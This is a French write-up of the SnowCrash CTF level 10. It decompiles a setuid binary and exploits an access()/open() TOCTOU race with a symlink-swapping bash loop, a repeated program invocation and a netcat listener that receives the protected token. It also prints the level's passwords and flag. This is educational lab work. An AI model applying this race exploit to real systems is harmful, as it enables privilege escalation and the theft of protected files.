# 10 - Binary exploit: race condition

- On se connecte en tant level10.
```
level10@SnowCrash:~$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```


- Un binaire nous a été laissé. Regardons ça de plus près avec [GDB](https://en.wikipedia.org/wiki/GNU_Debugger).
```
(gdb) info functions
All defined functions:

File level10.c:
int main(int, char **);

Non-debugging symbols:
0x080484d0  _init
...
```

```
(gdb) disas main
Dump of assembler code for function main:
    HUGE CODE
End of assembler dump.

(gdb) q
```


- Gagnons du temps et utilisons [Ghidra](https://en.wikipedia.org/wiki/Ghidra) pour obtenir une interprétation de ce binaire en C.
```c
int main(int argc,char **argv)
{
  ...  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (argc < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*in_stack_00000008);
    exit(1);
  }

  pcVar6 = (char *)in_stack_00000008[1];
  __cp = (char *)in_stack_00000008[2];

  iVar2 = access(pcVar6,4);
  if (iVar2 != 0) {
    iVar2 = printf("You don\'t have access to %s\n",pcVar6);
  }
  else {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    ...
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    ...

    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
      exit(1);
    }

    sVar4 = write(iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
      exit(1);
    }

    printf("Connected!\nSending file .. ");
    fflush(stdout);

    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
      exit(1);
    }

    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
      exit(1);
    }

    write(iVar2,local_1024,__n);
    iVar2 = puts("wrote file!");
  }

  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail();
  }
  return iVar2;
}
```


- On peut voir que le programme fait un appel à `access(argv[1])`. Si cet appel réussit, il tentera d'établir une connexion socket vers `argv[2]` à travers le port 6969 afin d'envoyer le contenu du fichier nommé `argv[1]`.


- `access()` ne prend pas en compte les bits setuid et setgid lors de la vérification des permissions. Le programme affichera donc `You don't have access to the token` et se terminera si on lui passe directement le token en paramètre.

- Cependant, `open()` prend en compte les bits setuid et setgid lors de la vérification des permissions.

- Avec un script, on peut créer un fichier accessible en lecture, le supprimer, puis créer un lien symbolique avec le même nom pointant vers le token. Ainsi, le programme pourra lire le token et nous l'envoyer.


- Du coup, avec netcat, on va écouter sur le port 6969:
>`nc -lk 6969 > /tmp/pwn.log`


- Ensuite, dans un autre terminal on lance notre script:
```bash
#!/bin/bash
while true
do
	touch /tmp/exploit
	rm /tmp/exploit
	ln -s /home/user/level10/token /tmp/exploit
	rm /tmp/exploit
done
```


- Enfin dans un troisième terminal, on lance le programme:
```bash
#!/bin/bash
while true
do
	/home/user/level10/level10 "/tmp/exploit" "127.0.0.1"
done
```


- Puis on attend d'avoir le bon timming.
```
level10@SnowCrash:~$ cat /tmp/pwn.log | grep -v ".*( )*."
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
woupa2yuojeeaaed06riuj63c
...
```

```
level10@SnowCrash:~$ su flag10
Password:woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
```

```
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

```
flag10@SnowCrash:~$ su level11
Password:feulo4b72j7edeahuete3no7c
level11@SnowCrash:~$
```